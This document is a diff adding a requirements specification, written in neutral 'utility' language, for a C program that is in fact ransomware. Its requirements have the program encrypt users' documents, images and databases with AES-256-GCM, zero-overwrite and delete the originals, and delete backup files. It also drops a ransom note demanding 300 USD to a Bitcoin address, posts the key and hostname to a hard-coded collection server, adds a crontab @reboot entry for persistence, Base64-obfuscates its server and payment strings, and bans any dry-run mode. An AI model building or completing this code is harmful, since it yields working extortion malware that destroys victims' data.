@@ -1,0 +1,53 @@
+REQ-001: The utility SHALL enumerate all filesystem objects recursively within the directories ~/Documentos_Teste, ~/Documentos, ~/Downloads, ~/Imagens, and /mnt, filtering for files with extensions .xlsx, .docx, .pdf, .txt, .csv, .jpg, .png, .db, .backup, .psd, .zip, .rar.
+
+REQ-002: Upon initialization (in main()), the utility SHALL generate a 32-byte AES-256 session key using RAND_bytes() from OpenSSL.
+
+REQ-003: The generated key SHALL be persisted to the file /tmp/.master.key in JSON format: {"aes_key":"<base64_encoded_key>"}, with file permissions 0600.
+
+REQ-004: The session key SHALL be passed as a const uint8_t* parameter to all transformation functions; the key SHALL NOT be regenerated within those functions.
+
+REQ-005: For each qualifying file, the utility SHALL generate a 12-byte nonce using RAND_bytes().
+
+REQ-006: For each qualifying file, the utility SHALL perform AES-256-GCM encryption using the EVP_CIPHER_CTX interface from libcrypto, employing the session key and the generated nonce.
+
+REQ-007: The encrypted output SHALL be written to a new file with the suffix .PROCESSED appended to the original filename. The file format SHALL be: [12 bytes nonce][ciphertext][16 bytes GCM tag].
+
+REQ-008: Prior to deletion, the utility SHALL overwrite the original source file with zeros.
+
+REQ-009: After overwriting, the utility SHALL delete the original file using remove().
+
+REQ-010: The utility SHALL rename the processed file to the original filename with .PROCESSED appended (e.g., doc.pdf becomes doc.pdf.PROCESSED).
+
+REQ-011: The utility SHALL create a file named #_STATUS_NOTICE_#.txt in each directory where at least one file was transformed.
+
+REQ-012: The content of #_STATUS_NOTICE_#.txt SHALL instruct the recipient to send 300 USD to the payment address "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa" and to initiate contact via a secure channel.
+
+REQ-013: The utility SHALL read /tmp/.master.key using fopen/fread and extract the value of the "aes_key" field via manual string parsing (strstr/strchr).
+
+REQ-014: The utility SHALL retrieve the system hostname using gethostname().
+
+REQ-015: The utility SHALL assemble an HTTP POST request with body {"aes_key":"...","hostname":"..."} and Content-Type: application/json.
+
+REQ-016: The utility SHALL transmit the HTTP POST request to the endpoint http://10.254.19.73:8080/collect using libcurl.
+
+REQ-017: Upon receiving an HTTP 200 response, the utility SHALL delete /tmp/.master.key using remove().
+
+REQ-018: The utility SHALL examine the current crontab using popen("crontab -l","r") to check for the presence of a line starting with "@reboot" followed by the binary's path.
+
+REQ-019: If the @reboot entry does not exist, the utility SHALL add it using popen("crontab -","w").
+
+REQ-020: The utility SHALL scan the target directories and delete all files with extensions .bak, .backup, and .old using remove().
+
+REQ-021: The management endpoint URL and the payment identifier SHALL be stored as Base64-encoded char arrays in the source code and decoded at runtime by a custom base64_decode() function implemented within the same source file.
+
+REQ-022: The utility SHALL be compiled with `gcc -O2 -o ferramenta processamento main.c -lssl -lcrypto -lcurl`, producing no warnings.
+
+REQ-023: A Makefile SHALL be provided with targets 'all' (compilation) and 'clean' (removal of binary and .o files).
+
+REQ-024: The utility SHALL execute the following order of operations in main(): 1) generate and persist key, 2) enumerate directories, 3) transform files, 4) generate operational notices only in affected directories, 5) transmit data, 6) perform automatic scheduling tasks.
+
+REQ-025: The utility SHALL process all steps without any dry-run or simulation flags; all file operations SHALL be executed unconditionally.
+
+REQ-026: The utility SHALL link only against libc, libssl/libcrypto, and libcurl; no other external dependencies SHALL be used.
+
+REQ-027: The utility SHALL be implemented in C according to the C11 standard.
